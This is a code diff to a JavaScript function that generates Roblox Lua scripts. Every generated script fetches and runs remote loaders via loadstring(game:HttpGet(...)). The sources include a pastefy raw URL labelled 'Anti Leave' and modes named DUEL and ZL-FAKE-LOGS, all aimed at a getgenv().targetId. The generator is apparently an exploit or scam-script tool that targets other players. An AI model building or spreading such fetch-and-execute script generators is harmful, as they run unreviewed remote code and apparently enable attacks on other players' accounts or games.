@@ -2369,26 +2369,35 @@ async function generateScript(){
 
   let customBlock = "";
   if(scriptMode === "CUSTOM" && customLoader) {
-    customBlock = `${customLoader}\n\n    task.wait(0.5)\n\n`;
+    customBlock = customLoader;
   } else if(scriptMode === "AUTO-CODE") {
-    customBlock = `loadstring(game:HttpGet("${AUTO_CODE_LOADER}"))()\n\n    task.wait(0.5)\n\n`;
+    customBlock = `loadstring(game:HttpGet("${AUTO_CODE_LOADER}"))()`;
   } else if(scriptMode === "DUEL") {
-    customBlock = `loadstring(game:HttpGet("${DUEL_LOADER}"))()\n\n    task.wait(0.5)\n\n`;
+    customBlock = `loadstring(game:HttpGet("${DUEL_LOADER}"))()`;
   } else if(scriptMode === "ZL-FAKE-LOGS") {
-    customBlock = `loadstring(game:HttpGet("${ZL_FAKE_LOGS_LOADER}"))()\n\n    task.wait(0.5)\n\n`;
+    customBlock = `loadstring(game:HttpGet("${ZL_FAKE_LOGS_LOADER}"))()`;
   }
 
   const useAntiLeave = document.getElementById("toggleAntiLeave").checked;
-  let execBlock = `    ${customBlock}loadstring(game:HttpGet("${LOGIC_LOADER}"))()`;
+  let execBlock = "";
+  if (customBlock) {
+    execBlock = `task.spawn(function()
+    ${customBlock}
+end)
+
+task.spawn(function()
+    task.wait(0.5)
+    loadstring(game:HttpGet("${LOGIC_LOADER}"))()
+end)`;
+  } else {
+    execBlock = `loadstring(game:HttpGet("${LOGIC_LOADER}"))()`;
+  }
   if (useAntiLeave) {
     execBlock = `task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/JhWiqjXL/raw"))() -- Anti Leave
 end)
 
-task.spawn(function()
-    ${customBlock}loadstring(game:HttpGet("${LOGIC_LOADER}"))()
-    task.wait(1)
-end)`;
+${execBlock}`;
   }
 
   let script = `getgenv().targetId = ${targetId}
